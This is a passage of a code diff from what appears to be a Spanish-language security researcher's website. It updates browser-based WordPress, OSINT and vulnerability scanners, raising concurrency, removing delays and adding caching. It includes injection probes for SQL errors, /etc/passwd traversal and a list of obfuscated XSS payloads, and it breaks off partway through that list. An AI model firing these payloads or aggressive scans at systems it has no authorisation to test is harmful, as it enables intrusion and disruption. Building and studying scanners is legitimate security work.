-  alog('\u2500\u2500 RESUMEN ' + MMT_VERSION + ' \u2500\u2500');
-  alog('VEREDICTO: ' + verdict, S.wp2shell || crit > 0 ? 'mmt-crit' : 'mmt-ok');
-  alog('WP: ' + (S.wpVersion || 'desconocida') + (S.versionSource ? ' (' + S.versionSource + ')' : '') + ' \u00b7 theme: ' + (S.theme || "n\u002fd") + ' \u00b7 plugins: ' + Object.keys(S.plugins).length + ' activos + ' + S.passivePlugins.length + ' pasivos \u00b7 users: ' + S.users.length + ' \u00b7 archivos expuestos: ' + S.filesHit.length + ' \u00b7 CVEs: core ' + S.coreCves.length + ' + plugins ' + S.plugCves.length);
-  alog('peticiones: ' + S.requests + ' \u00b7 ' + S.elapsed + 's \u00b7 CERO DA\u00d1O: solo GET read-only, sin logins, sin chain wp2shell, sin dump (firmas solamente)');
-  alog('\u2139 HONESTIDAD: los veredictos VULNERABLE POR VERSI\u00d3N se afirman por rango de versi\u00f3n + presencia \u2014 el chain NO se ejecuta; REFLEJA \u2260 explotado; lo que no tiene evidencia no se reporta.');
+  alog('\u2550\u2550 AUDITORÍA FINALIZADA (' + S.elapsed + 's) \u00b7 ' + MMT_VERSION + ' \u2550\u2550', 'mmt-ok');
+  alog('VEREDICTO FINAL: ' + verdict, S.wp2shell || crit > 0 ? 'mmt-crit' : 'mmt-ok');
+  alog('WP: ' + (S.wpVersion || 'n\u002fd') + (S.versionSource ? ' (' + S.versionSource + ')' : '') + ' \u00b7 theme: ' + (S.theme || "n\u002fd") + ' \u00b7 plugins: ' + Object.keys(S.plugins).length + ' activos + ' + S.passivePlugins.length + ' pasivos \u00b7 users: ' + S.users.length + ' \u00b7 archivos expuestos: ' + S.filesHit.length + ' \u00b7 CVEs: core ' + S.coreCves.length + ' + plugins ' + S.plugCves.length);
+  alog('peticiones completadas: ' + S.requests + ' sondas HTTP \u00b7 tiempo total: ' + S.elapsed + 's \u00b7 CERO DA\u00d1O (solo lectura y verificación por firma)');
 
-  /* perfil con memoria */
-  profSave(S.host, { lastVersion: S.wpVersion || (prof(S.host).lastVersion || ''), theme: S.theme, pluginsCount: Object.keys(S.plugins).length, usersCount: S.users.length, knownPlugins: Object.keys(S.plugins), knownUsers: S.users.slice(0, 25), lastRun: Date.now() });
+  if(S.isWP){
+    profSave(S.host, { lastVersion: S.wpVersion || (prof(S.host).lastVersion || ''), theme: S.theme, pluginsCount: Object.keys(S.plugins).length, usersCount: S.users.length, knownPlugins: Object.keys(S.plugins), knownUsers: S.users.slice(0, 25), lastRun: Date.now() });
+  }
 
+  mmtSetProgress(100, '');
   var sum = $('mmt-summary');
   if(sum){
     sum.innerHTML =
-      "\u003cdiv class=\"mmt-chip\"\u003e" + (S.wpVersion ? 'WP ' + esc(S.wpVersion) : "WP n\u002fd") + "\u003c\u002fdiv\u003e" +
-      "\u003cdiv class=\"mmt-chip\"\u003e" + (S.theme ? esc(S.theme) : "theme n\u002fd") + "\u003c\u002fdiv\u003e" +
-      "\u003cdiv class=\"mmt-chip\"\u003e📦 " + Object.keys(S.plugins).length + " plugins\u003c\u002fdiv\u003e" +
-      "\u003cdiv class=\"mmt-chip\"\u003e👤 " + S.users.length + " users\u003c\u002fdiv\u003e" +
-      "\u003cdiv class=\"mmt-chip\"\u003e⚠ " + S.filesHit.length + " files\u003c\u002fdiv\u003e" +
-      "\u003cdiv class=\"mmt-chip\"\u003e☠ " + (S.coreCves.length + S.plugCves.length) + " CVEs\u003c\u002fdiv\u003e" +
-      "\u003cdiv class=\"mmt-chip\"\u003e" + (S.wp2shell ? '\u2620 WP2SHELL' : 'wp2shell: no') + "\u003c\u002fdiv\u003e" +
-      "\u003cdiv class=\"mmt-chip\"\u003e" + S.requests + ' req \u00b7 ' + S.elapsed + "s\u003c\u002fdiv\u003e";
+      '<div class="mmt-chip" style="font-weight:700;' + badgeStyle + '">' + badgeLabel + '</div>' +
+      '<div class="mmt-chip">' + (S.wpVersion ? 'WP ' + esc(S.wpVersion) : "WP n\u002fd") + '</div>' +
+      '<div class="mmt-chip">' + (S.theme ? esc(S.theme) : "theme n\u002fd") + '</div>' +
+      '<div class="mmt-chip">📦 ' + Object.keys(S.plugins).length + ' plugins</div>' +
+      '<div class="mmt-chip">👤 ' + S.users.length + ' users</div>' +
+      '<div class="mmt-chip">⚠ ' + S.filesHit.length + ' files</div>' +
+      '<div class="mmt-chip">☠ ' + (S.coreCves.length + S.plugCves.length) + ' CVEs</div>' +
+      '<div class="mmt-chip">' + (S.wp2shell ? '\u2620 WP2SHELL' : 'wp2shell: no') + '</div>' +
+      '<div class="mmt-chip">📡 ' + S.requests + ' req \u00b7 ' + S.elapsed + 's</div>';
   }
-  $('mmt-progress').style.width = '100%';
   window.tudelaSecMammothData = S;
 }
 
 /* ── export JSON ── */
 function mmtExport(){
-  if(!S || !S.host){ return; }
+  if(!S || !S.host){
+    alog('\u26a0 Ejecuta primero un escaneo MAMMOTH antes de exportar JSON.', 'mmt-warn');
+    return;
+  }
   var data = {
-    tool: MMT_VERSION, target: S.url, host: S.host, ts: new Date().toISOString(),
+    tool: MMT_VERSION, status: S.status || 'completed', verdict: S.verdict || '',
+    target: S.url, host: S.host, ts: new Date().toISOString(),
     wpVersion: S.wpVersion, versionSource: S.versionSource, theme: S.theme,
     plugins: S.plugins, passivePlugins: S.passivePlugins, themes: S.themes, users: S.users,
     restNamespaces: S.restNamespaces, filesExposed: S.filesHit.map(function(f){ return { path: f.path, sev: f.sev, desc: f.desc }; }),
@@ -14823,17 +15430,24 @@ function mmtExport(){
   setTimeout(function(){ URL.revokeObjectURL(a.href); a.remove(); }, 500);
 }
 
-/* ── wiring UI ── */
-document.addEventListener('DOMContentLoaded', function(){
+/* ── wiring UI idempotente (funciona tanto en loading como post-DOMContentLoaded) ── */
+var mmtWired = false;
+function mmtWire(){
+  if(mmtWired) return;
+  mmtWired = true;
   var run = $('mmt-run');
   if(run) run.addEventListener('click', mmtRun);
+  var inp = $('mmt-target');
+  if(inp) inp.addEventListener('keydown', function(e){ if(e.key === 'Enter') mmtRun(); });
   var stop = $('mmt-stop');
-  if(stop) stop.addEventListener('click', function(){ aborted = true; alog('\u26a0 DETENIDO por el operador.', 'mmt-warn'); });
+  if(stop) stop.addEventListener('click', mmtStopNow);
   var exp = $('mmt-export');
   if(exp) exp.addEventListener('click', mmtExport);
   window.tudelaSecMammothRun = mmtRun;
-  window.tudelaSecMammothStop = function(){ aborted = true; };
-});
+  window.tudelaSecMammothStop = mmtStopNow;
+}
+if(document.readyState === 'loading') document.addEventListener('DOMContentLoaded', mmtWire);
+else mmtWire();
 })();
 </script>
 
@@ -15015,8 +15629,8 @@ document.addEventListener('DOMContentLoaded', function(){
 
     <div class="crb-controls-row">
       <span class="crb-tag" id="crb-category-count">— rutas</span>
-      <label class="crb-num-label">Concurrencia <input type="number" id="crb-concurrency" value="4" min="1" max="20" title="Máximo de hilos. El auto-ajuste baja solo si el objetivo responde 530/429"></label>
-      <label class="crb-num-label">Delay (ms) <input type="number" id="crb-delay" value="150" min="0" max="3000" title="Pausa entre despachos (ms). Sube solo si el objetivo limita"></label>
+      <label class="crb-num-label">Concurrencia <input type="number" id="crb-concurrency" value="18" min="1" max="40" title="Máximo de hilos. El auto-ajuste baja solo si el objetivo responde 530/429"></label>
+      <label class="crb-num-label">Delay (ms) <input type="number" id="crb-delay" value="0" min="0" max="3000" title="Pausa entre despachos (ms). Sube solo si el objetivo limita"></label>
       <button class="crb-ctrl-btn" id="crb-pause-btn" disabled>⏸ PAUSAR</button>
       <button class="crb-ctrl-btn" id="crb-resume-btn" style="display:none;">▶ REANUDAR</button>
       <button class="crb-ctrl-btn crb-ctrl-danger" id="crb-cancel-btn" disabled>✕ CANCELAR</button>
@@ -15543,7 +16157,7 @@ document.addEventListener('DOMContentLoaded', function(){
       </div></div>
     </div>
     <div style="margin-top:48px;display:flex;align-items:center;gap:24px;flex-wrap:wrap;" class="reveal-wrap"><div class="reveal-inner" style="display:flex;align-items:center;gap:24px;flex-wrap:wrap;">
-      <a href="/cdn-cgi/l/email-protection#66080f05090a0715121302030a075f5126010b070f0a4805090b" class="btn-lusion primary"><i class="fa-solid fa-envelope" style="margin-right:8px;"></i>Solicitar auditoría</a>
+      <a href="/cdn-cgi/l/email-protection#88e6e1ebe7e4e9fbfcfdecede4e9b1bfc8efe5e9e1e4a6ebe7e5" class="btn-lusion primary"><i class="fa-solid fa-envelope" style="margin-right:8px;"></i>Solicitar auditoría</a>
       <span style="font-family:var(--mono);font-size:12px;color:var(--muted);">Disponible para trabajos privados · Entrega de reporte en 5-10 días hábiles</span>
     </div></div>
   </div>
@@ -16191,7 +16805,7 @@ dig assets.lime.bike CNAME</div></div></div>
           <a href="https://bugbounty.intigriti.com/researcher/tudelasec" target="_blank" rel="noopener noreferrer" class="slink"><div class="icon inc"><i class="fa-solid fa-crosshairs"></i></div><div class="slink-info"><span class="slink-lbl">Intigriti</span><span class="slink-val">intigriti.com/tudelasec</span></div></a>
           <a href="https://github.com/tudelasec" target="_blank" rel="noopener noreferrer" class="slink"><div class="icon ghc"><i class="fa-brands fa-github"></i></div><div class="slink-info"><span class="slink-lbl">GitHub</span><span class="slink-val">github.com/tudelasec</span></div></a>
           <a href="https://linkedin.com/in/tudelasec" target="_blank" rel="noopener noreferrer" class="slink"><div class="icon linc"><i class="fa-brands fa-linkedin"></i></div><div class="slink-info"><span class="slink-lbl">LinkedIn</span><span class="slink-val">linkedin.com/in/tudelasec</span></div></a>
-          <a href="/cdn-cgi/l/email-protection#402e29232f2c2133343524252c21797700272d21292c6e232f2d" class="slink"><div class="icon emc"><i class="fa-solid fa-envelope"></i></div><div class="slink-info"><span class="slink-lbl">Email</span><span class="slink-val"><span class="__cf_email__" data-cfemail="701e19131f1c1103040514151c11494730171d11191c5e131f1d">[email&#160;protected]</span></span></div></a>
+          <a href="/cdn-cgi/l/email-protection#4a24232925262b393e3f2e2f262b737d0a2d272b232664292527" class="slink"><div class="icon emc"><i class="fa-solid fa-envelope"></i></div><div class="slink-info"><span class="slink-lbl">Email</span><span class="slink-val"><span class="__cf_email__" data-cfemail="c0aea9a3afaca1b3b4b5a4a5aca1f9f780a7ada1a9aceea3afad">[email&#160;protected]</span></span></div></a>
         </div>
       </div></div>
       <div class="reveal-wrap"><div class="reveal-inner">
@@ -19038,52 +19652,55 @@ async function workerBatch(targets) {
   });
 
   if (resolved.length) {
-    try {
-      var response = await fetch(PROXY_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': "application\u002fjson" },
-        body: JSON.stringify({
-          targets: resolved.map(function(r){
-            var item = { url: r.req.url, method: r.req.method || 'GET' };
-            if (r.req.headers) item.headers = r.req.headers;
-            return item;
-          }),
-        }),
-      });
-      if (!response.ok) throw new Error('Proxy error: HTTP ' + response.status);
-      var payload = await response.json();
-      var batchResults = payload.results || [];
-
-      resolved.forEach(function(r, i) {
-        var res = batchResults[i];
-        var api = r.target;
-        if (!res || res.ok === false) {
-          var errMsg = (res && res.error) || 'Sin respuesta';
-          applyErrorResult(api, errMsg);
-          results[api.id] = { error: errMsg };
-          return;
-        }
-        try {
-          var parsed = api.parse(res.body, api.query, res);
-          applyParsedResult(api, res, parsed);
-          results[api.id] = parsed;
-        } catch (parseErr) {
-          applyErrorResult(api, parseErr.message);
-          results[api.id] = { error: parseErr.message };
-        }
-      });
-    } catch (proxyErr) {
-      /* El POST por lote fallo entero (worker caido, timeout, etc). Antes de rendirse
-         al fetch directo (que choca con CORS en la mayoria de las APIs externas),
-         se intenta una llamada individual al proxy por cada target. */
-      for (var ri = 0; ri < resolved.length; ri++) {
-        var ok = await fetchViaProxySingle(resolved[ri]);
-        if (!ok) fetchDirectFallback(resolved[ri].target);
-      }
+    var chunks = [];
+    for (var ci = 0; ci < resolved.length; ci += 25) {
+      chunks.push(resolved.slice(ci, ci + 25));
     }
+    await Promise.all(chunks.map(async function(chunk) {
+      try {
+        var response = await fetch(PROXY_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': "application\u002fjson" },
+          body: JSON.stringify({
+            targets: chunk.map(function(r){
+              var item = { url: r.req.url, method: r.req.method || 'GET' };
+              if (r.req.headers) item.headers = r.req.headers;
+              return item;
+            }),
+          }),
+        });
+        if (!response.ok) throw new Error('Proxy error: HTTP ' + response.status);
+        var payload = await response.json();
+        var batchResults = payload.results || [];
+
+        chunk.forEach(function(r, i) {
+          var res = batchResults[i];
+          var api = r.target;
+          if (!res || res.ok === false) {
+            var errMsg = (res && res.error) || 'Sin respuesta';
+            applyErrorResult(api, errMsg);
+            results[api.id] = { error: errMsg };
+            return;
+          }
+          try {
+            var parsed = api.parse(res.body, api.query, res);
+            applyParsedResult(api, res, parsed);
+            results[api.id] = parsed;
+          } catch (parseErr) {
+            applyErrorResult(api, parseErr.message);
+            results[api.id] = { error: parseErr.message };
+          }
+        });
+      } catch (proxyErr) {
+        await Promise.all(chunk.map(async function(rItem) {
+          var ok = await fetchViaProxySingle(rItem);
+          if (!ok) await fetchDirectFallback(rItem.target);
+        }));
+      }
+    }));
   }
 
-  skipped.forEach(function(api) { fetchDirectFallback(api); });
+  await Promise.all(skipped.map(function(api) { return fetchDirectFallback(api); }));
   return results;
 }
 
@@ -19427,6 +20044,7 @@ async function runOsint() {
   var sectDiv = document.getElementById('osint-sections');
   var color = qTypes[currentType].color;
 
+  try {
   btn.disabled = true;
   btn.innerHTML = "\u003cspan class=\"osint-spinner\"\u003e\u003c\u002fspan\u003e Escaneando...";
   resultsDiv.style.display = 'block';
@@ -19492,7 +20110,7 @@ async function runOsint() {
     if (phase1.shodanidb.hostnames) findings.shodan.hostnames = phase1.shodanidb.hostnames;
   }
   if (phase1.sslhdr && phase1.sslhdr.headers) { findings.headers.raw = Object.keys(phase1.sslhdr.headers).map(function(k){return k+': '+phase1.sslhdr.headers[k];}).join('\n'); findings.headers.server = phase1.sslhdr.headers['server']||''; phase1_sslhdr = phase1.sslhdr; }
-  if (phase1.headers) findings.headers.raw = (findings.headers.raw||'')+'\n'+phase1.headers.items.join('\n');
+  if (phase1.headers && Array.isArray(phase1.headers.items)) findings.headers.raw = (findings.headers.raw||'')+'\n'+phase1.headers.items.join('\n');
   if (phase1.wbcx && phase1.wbcx.items) findings.wayback = phase1.wbcx.items.map(function(r){ return r.split(' [')[0]; });
   if (phase1.robotsTxt) {
     findings.security.robots = { disallows: phase1.robotsTxt.disallows||[], sitemaps: phase1.robotsTxt.sitemaps||[], sensitivePaths: phase1.robotsTxt.sensitivePaths||[] };
@@ -20171,9 +20789,13 @@ async function runOsint() {
   statusDiv.innerHTML = "\u003ci class=\"fa-solid fa-circle-check\" style=\"color:var(--green)\"\u003e\u003c\u002fi\u003e Escaneo completado — \u003cb style=\"color:"+color+"\"\u003e"+escHtml(q)+"\u003c\u002fb\u003e — Risk: \u003cb style=\"color:"+scoreColor+"\"\u003e"+score+"\u002f100\u003c\u002fb\u003e — "+totalSrcs+' vectores activos';
   showToast('Escaneo v6.2 completo', 'Risk: '+score+"\u002f100 · "+findings.riskFactors.length+' factores · '+findings.subdomains.length+' subdominios · '+findings.cves.length+' CVEs · '+findings.security.sensitiveDirs.length+' dirs', score >= 70 ? 'danger' : 'success', 6000);
   logFindingResult();
-  btn.disabled = false;
-  btn.innerHTML = "\u003ci class=\"fa-solid fa-magnifying-glass\" style=\"margin-right:6px;\"\u003e\u003c\u002fi\u003eBuscar";
-  scanning = false;
+  } catch (osintErr) {
+    statusDiv.innerHTML = "\u003cspan style=\"color:var(--amber)\"\u003e\u26A0 Escaneo finalizado con advertencia: " + escHtml(osintErr && osintErr.message ? osintErr.message : String(osintErr)) + "\u003c\u002fspan\u003e";
+  } finally {
+    btn.disabled = false;
+    btn.innerHTML = "\u003ci class=\"fa-solid fa-magnifying-glass\" style=\"margin-right:6px;\"\u003e\u003c\u002fi\u003eBuscar";
+    scanning = false;
+  }
 }
 
 /* ═══════════════════════════════════════
@@ -26514,7 +27136,8 @@ clearTimeout(tid);
 return await unwrapProxyResp(r);
 }catch(e){return null;}
 }
-async function get(url){var t0=performance.now();try{var j=await pfx(url);var el=performance.now()-t0;if(!j)return{ok:false,status:0,headers:{},body:'',time:el};var h={};if(j.headers)for(var k in j.headers)h[k.toLowerCase()]=j.headers[k];var bd=(typeof j.body==='string')?j.body:'';return{ok:!!j.ok,status:j.status||0,headers:h,body:bd.slice(0,250000),time:el};}catch(e){return{ok:false,status:0,headers:{},body:'',time:performance.now()-t0};}}
+var _getCache=new Map();
+async function get(url){if(_getCache.has(url)){var cv=_getCache.get(url);return Promise.resolve({ok:cv.ok,status:cv.status,headers:cv.headers,body:cv.body,time:0.2});}var t0=performance.now();try{var j=await pfx(url);var el=performance.now()-t0;if(!j)return{ok:false,status:0,headers:{},body:'',time:el};var h={};if(j.headers)for(var k in j.headers)h[k.toLowerCase()]=j.headers[k];var bd=(typeof j.body==='string')?j.body:'';var res={ok:!!j.ok,status:j.status||0,headers:h,body:bd.slice(0,250000),time:el};if(_getCache.size<2500)_getCache.set(url,res);return res;}catch(e){return{ok:false,status:0,headers:{},body:'',time:performance.now()-t0};}}
 
 /* ==== Validacion por firmas (content matching) para reducir falsos positivos de soft-404 ==== */
 function sfHash(s){var h=0;for(var i=0;i<s.length;i++){h=(h*31+s.charCodeAt(i))|0;}return h;}
@@ -26586,7 +27209,7 @@ async function doh(name,type){try{var r=await fetch("https:\u002f\u002f1.1.1.1\u
 async function batch(urls){return Promise.allSettled(urls.map(function(u){return get(u);}));}
 function uenc(s){return encodeURIComponent(s);}
 /* === ADAPTIVE INTELLIGENCE ENGINE v2.0 === */
-var aimd={concurrency:8,min:2,max:24,success:0,fail:0,rttSum:0,rttCount:0,adjusting:false};
+var aimd={concurrency:25,min:8,max:50,success:0,fail:0,rttSum:0,rttCount:0,adjusting:false};
 function isDeadResult(r){if(r.status!=='fulfilled'||!r.value)return true;return r.value.status===404||r.value.status===0||r.value.status===502;}
 function ctxSkip(tag){return !!(S.ctx&&S.ctx.skipPhases&&S.ctx.skipPhases.indexOf(tag)>-1);}
 
@@ -26771,7 +27394,7 @@ function logSep(l){log('','dim');log('\u250C\u2500 '+l+' '+'\u2500'.repeat(Math.
 function logOk(m){log('  \u2713 '+m,'ok');}function logWarn(m){log('  \u26A0 '+m,'amber');}function logErr(m){log('  \u2717 '+m,'red');}function logCrit(m){log('  \u2620 '+m,'crit');}function logInfo(m){log('  \u00B7 '+m,'dim');}
 function addF(sev,name,detail){sev=sev.toLowerCase();counts[sev]=(counts[sev]||0)+1;var e={crit:statCrit,high:statHigh,med:statMed,low:statLow}[sev];if(e){e.textContent=counts[sev];e.closest('.scan-stat').classList.remove('zero');}var em=findings.querySelector('.scan-empty');if(em)em.style.display='none';var lb={crit:'CRITICAL',high:'HIGH',med:'MEDIUM',low:'LOW'};var ts=new Date(),t=('0'+ts.getHours()).slice(-2)+':'+('0'+ts.getMinutes()).slice(-2)+':'+('0'+ts.getSeconds()).slice(-2);var c=document.createElement('div');c.className='sf-card '+sev;c.innerHTML="\u003cdiv class=\"sf-top\"\u003e\u003cspan class=\"sf-badge "+sev+"\"\u003e"+lb[sev]+"\u003c\u002fspan\u003e\u003cspan class=\"sf-name\"\u003e"+esc(name)+"\u003c\u002fspan\u003e\u003c\u002fdiv\u003e"+(detail?"\u003cdiv class=\"sf-detail\"\u003e"+esc(detail.slice(0,140))+"\u003c\u002fdiv\u003e":'')+"\u003cdiv class=\"sf-time\"\u003e"+t+"\u003c\u002fdiv\u003e";if(sev==='crit'||sev==='high')findings.insertBefore(c,findings.firstChild);else findings.appendChild(c);}
 function markCrit(id){var el=document.getElementById('sph-'+id);if(el)el.classList.add('crit');}
-function sl(m){return new Promise(function(r){setTimeout(r,m);});}
+function sl(m){return m<=15?Promise.resolve():new Promise(function(r){setTimeout(r,Math.min(m,4));});}
 var scanMode='furia';
 var MODE_LIMITS={basico:30,pro:166,furia:Infinity};
 var _tpCallCount=0;
@@ -26886,8 +27509,9 @@ var PHASES=[
 {id:'p201',i:'\uD83D\uDC80',n:'Reporte'}
 ];
 var totalP=PHASES.length;
-function buildP(){phasesEl.innerHTML='';PHASES.forEach(function(p){var d=document.createElement('div');d.className='scan-phase';d.id='sph-'+p.id;d.innerHTML="\u003cdiv class=\"scan-phase-icon\"\u003e"+p.i+"\u003c\u002fdiv\u003e\u003cdiv class=\"scan-phase-name\"\u003e"+p.n+"\u003c\u002fdiv\u003e";phasesEl.appendChild(d);});}
-function setP(n){var ph=PHASES[n];if(!ph)return;PHASES.forEach(function(p,i){var el=document.getElementById('sph-'+p.id);if(!el)return;el.classList.remove('active');if(i<n)el.classList.add('done');if(i===n)el.classList.add('active');});var pct=Math.round((n/totalP)*100);progFill.style.width=pct+'%';progPct.textContent=pct+'%';progPhase.textContent=ph.i+' '+ph.n+'...';if(progIcon)progIcon.textContent=ph.i;if(progLabel)progLabel.textContent=ph.n;if(progNum)progNum.textContent='F'+String(n+1).padStart(2,'0');if(progCounter)progCounter.textContent='Fase '+(n+1)+" \u002f "+totalP;if(progStatus){progStatus.className='scan-prog-status running';progStatus.innerHTML="\u003cspan class=\"dot\"\u003e\u003c\u002fspan\u003e EN PROGRESO";}}
+var _maxPct=0;
+function buildP(){_maxPct=0;phasesEl.innerHTML='';PHASES.forEach(function(p){var d=document.createElement('div');d.className='scan-phase';d.id='sph-'+p.id;d.innerHTML="\u003cdiv class=\"scan-phase-icon\"\u003e"+p.i+"\u003c\u002fdiv\u003e\u003cdiv class=\"scan-phase-name\"\u003e"+p.n+"\u003c\u002fdiv\u003e";phasesEl.appendChild(d);});}
+function setP(n){var ph=PHASES[n];if(!ph)return;PHASES.forEach(function(p,i){var el=document.getElementById('sph-'+p.id);if(!el)return;el.classList.remove('active');if(i<n)el.classList.add('done');if(i===n)el.classList.add('active');});var denom=Math.min(totalP,MODE_LIMITS[scanMode]||totalP);var pct=Math.min(99,Math.max(_maxPct,Math.round(((_tpCallCount||n)/denom)*100)));_maxPct=pct;progFill.style.width=pct+'%';progPct.textContent=pct+'%';progPhase.textContent=ph.i+' '+ph.n+'...';if(progIcon)progIcon.textContent=ph.i;if(progLabel)progLabel.textContent=ph.n;if(progNum)progNum.textContent='F'+String(n+1).padStart(2,'0');if(progCounter)progCounter.textContent='Fase '+Math.min(_tpCallCount||n+1,denom)+" \u002f "+denom;if(progStatus){progStatus.className='scan-prog-status running';progStatus.innerHTML="\u003cspan class=\"dot\"\u003e\u003c\u002fspan\u003e EN PROGRESO";}}
 function doneAll(){PHASES.forEach(function(p){var el=document.getElementById('sph-'+p.id);if(el){el.classList.remove('active');if(!el.classList.contains('crit'))el.classList.add('done');}});progFill.style.width='100%';progPct.textContent='100%';progPhase.textContent='\u2713 LEVIATÁN v9.0 COMPLETO';stopTimer();if(progIcon)progIcon.textContent=PHASES[totalP-1]?PHASES[totalP-1].i:'';if(progLabel)progLabel.textContent='LEVIATAN v9.0 — ANIQUILACION TOTAL COMPLETADA';if(progNum)progNum.textContent='F'+totalP;if(progCounter)progCounter.textContent=totalP+" \u002f "+totalP+' fases';if(progStatus){progStatus.className='scan-prog-status done';progStatus.innerHTML="\u003cspan class=\"dot\"\u003e\u003c\u002fspan\u003e COMPLETADO";}}
 function host(u){try{return new URL(u).hostname;}catch(e){return u;}}
 /* ══ Wake Lock + deteccion de pestaña en segundo plano ══
@@ -27893,34 +28517,35 @@ var injFound=0;
 var sqliBase=await get(target+'?id=1');var sqliBaseBody=sqliBase.body||'';
 var xssBase=await get(target+'?q=zxcvbnm123456');var xssBaseBody=xssBase.body||'';
 var sqliErrRe=/ORA-\d{5}|SQLSTATE\[[\dA-Z]{5}\]|sqlite3\.OperationalError|mysql_fetch|sql syntax|You have an error in your SQL|PostgreSQLError|psycopg2|Microsoft SQL Server|ODBC SQL Server|SQLServer JDBC|mariadb/i;
-for(var ti=0;ti<testPaths.length;ti++){var ri=await get(testPaths[ti]);
+var testResArr=await smartBatch(testPaths);
+for(var ti=0;ti<testPaths.length;ti++){var ri=(testResArr[ti]&&testResArr[ti].status==='fulfilled'&&testResArr[ti].value)?testResArr[ti].value:{ok:false,status:0,body:''};
 if(ri.ok&&ri.body){if(sqliErrRe.test(ri.body)&&!sqliErrRe.test(sqliBaseBody)){logErr('SQLi: '+testPaths[ti].split('?')[1]+' — error SQL especifico');addF('high','SQLi detectada','Error SQL especifico visible');markCrit('p13');injFound++;}
 else if(/sql syntax|syntax error|unclosed quotation/i.test(ri.body)&&!/sql syntax|syntax error|unclosed quotation/i.test(sqliBaseBody)&&ri.status!==500){logErr('SQLi posible: '+testPaths[ti].split('?')[1]);addF('high','SQLi detectada','Error SQL visible');markCrit('p13');injFound++;}
 else if(ri.status===500&&/\'|UNION|SELECT/i.test(testPaths[ti])&&!sqliErrRe.test(ri.body)){logInfo('SQLi posible (500 sin error SQL): '+testPaths[ti].split('?')[1]+' — requiere validacion manual');addF('low','SQLi 500 sin error especifico','Status 500 — podria ser SQLi o error generico');}
 if(/root:x:0:0/.test(ri.body)&&!/root:x:0:0/.test(sqliBaseBody)){logErr('Path Traversal!');addF('crit',"Path Traversal \u002f LFI","Contenido \u002fetc\u002fpasswd");markCrit('p13');injFound++;}
 var xssBody=ri.body.replace(new RegExp(target.replace(/[.*+?^${}()|[\]\\]/g,"\\$\u0026"),'g'),'');
 if(/\x3c\x73cript\x3e\x61lert\(1\)\x3c\/\x73cript\x3e|\x3csvg\/\x6fnload=\x61lert\(1\)\x3e/i.test(xssBody)&&!/\x3c\x73cript\x3e\x61lert\(1\)\x3c\/\x73cript\x3e|\x3csvg\/\x6fnload=\x61lert\(1\)\x3e/i.test(xssBaseBody)){logErr('XSS Reflejado!');addF('high','XSS Reflejado','Payload sin sanitizar en HTML');markCrit('p13');injFound++;}
-else if(/\x26lt;\x73cript\x26gt;|\x26lt;svg\/\x6fnload/.test(xssBody)&&!/\x26lt;\x73cript\x26gt;|\x26lt;svg\/\x6fnload/.test(xssBaseBody)){logInfo('XSS codificado: '+testPaths[ti].split('?')[1]+' — payload HTML-escaped');addF('low','XSS codificado (no explotable)','Payload reflejado pero HTML-escaped');}}
-await sl(10);}
+else if(/\x26lt;\x73cript\x26gt;|\x26lt;svg\/\x6fnload/.test(xssBody)&&!/\x26lt;\x73cript\x26gt;|\x26lt;svg\/\x6fnload/.test(xssBaseBody)){logInfo('XSS codificado: '+testPaths[ti].split('?')[1]+' — payload HTML-escaped');addF('low','XSS codificado (no explotable)','Payload reflejado pero HTML-escaped');}}}
 if(injFound===0)logOk('No se detectaron inyecciones basicas');
 /* F13b: XSS avanzado — DOM clobbering, mutation XSS, SVG, polyglot, data URI */
 logInfo('F13b: XSS avanzado — DOM clobbering, mXSS, SVG, polyglot...');
 var xssAdv=[target+"\u002f?q=\u003csvg\u002f\u006fnload=\u0061lert(1)\u003e",target+"\u002f?q=\u003cimg\u002fsrc=x\u002f\u006fnerror=\u0061lert(1)\u003e",target+"\u002f?q=\u003cbody\u002f\u006fnload=\u0061lert(1)\u003e",target+"\u002f?q=\u003csvg\u003e\u003canimate\u002f\u006fnbegin=\u0061lert(1)\u003e",target+"\u002f?q=\u003csvg\u003e\u003cset attributeName=\u006fnload to=\u0061lert(1)\u003e",target+"\u002f?q=\u003cdetails\u002fopen\u002f\u006fntoggle=\u0061lert(1)\u003e",target+"\u002f?q=\u003cdialog\u002fopen\u002fonclose=\u0061lert(1)\u003e",target+"\u002f?q=\u003cmarquee\u002f\u006fnstart=\u0061lert(1)\u003e",target+"\u002f?q=\u003cvideo\u003e\u003csource\u002f\u006fnerror=\u0061lert(1)\u003e",target+"\u002f?q=\u003caudio\u002fsrc=x\u002f\u006fnerror=\u0061lert(1)\u003e",target+"\u002f?q=\u003cmath\u003e\u003cmtext\u003e\u003ctable\u003e\u003cmglyph\u003e\u003cstyle\u003e\u003c!--\u003c\u002fstyle\u003e\u003cimg src=x \u006fnerror=\u0061lert(1)\u003e",target+"\u002f?q=\u003csvg\u003e\u003cuse href=data:image\u002fsvg+xml,\u003csvg \u006fnload=\u0061lert(1)\u003e\u003e\u003c\u002fuse\u003e\u003c\u002fsvg\u003e",target+"\u002f?q=\u003csvg\u003e\u003cforeignObject\u003e\u003cbody \u006fnload=\u0061lert(1)\u003e\u003c\u002fforeignObject\u003e\u003c\u002fsvg\u003e",target+"\u002f?q=\u003cno\u0073cript\u003e\u003cp title=\"\u003c\u002fno\u0073cript\u003e\u003cimg src=x \u006fnerror=\u0061lert(1)\u003e\"\u003e",target+"\u002f?q=\u003ctemplate\u003e\u003cimg src=x \u006fnerror=\u0061lert(1)\u003e\u003c\u002ftemplate\u003e",target+"\u002f?q=\u003cstyle\u003e\u003cimg src=x \u006fnerror=\u0061lert(1)\u003e\u003c\u002fstyle\u003e",target+"\u002f?q=\u003cxmp\u003e\u003cimg src=x \u006fnerror=\u0061lert(1)\u003e\u003c\u002fxmp\u003e",target+"\u002f?q=\u003ciframe\u003e\u003csvg \u006fnload=\u0061lert(1)\u003e\u003c\u002fiframe\u003e",target+"\u002f?q=\u003cform\u003e\u003cbutton formaction=java\u0073cript:\u0061lert(1)\u003eX\u003c\u002fbutton\u003e\u003c\u002fform\u003e",target+"\u002f?q=\u003cobject\u002fdata=java\u0073cript:\u0061lert(1)\u003e",target+"\u002f?q=\u003cembed\u002fsrc=java\u0073cript:\u0061lert(1)\u003e",target+"\u002f?q=\u003cmath href=java\u0073cript:\u0061lert(1)\u003eCLICKME\u003c\u002fmath\u003e",target+"\u002f?q=\u003cbase href=java\u0073cript:\u0061lert(1)\u002f\u002f\u003e",target+"\u002f?q=\u003cframeset\u003e\u003cframe 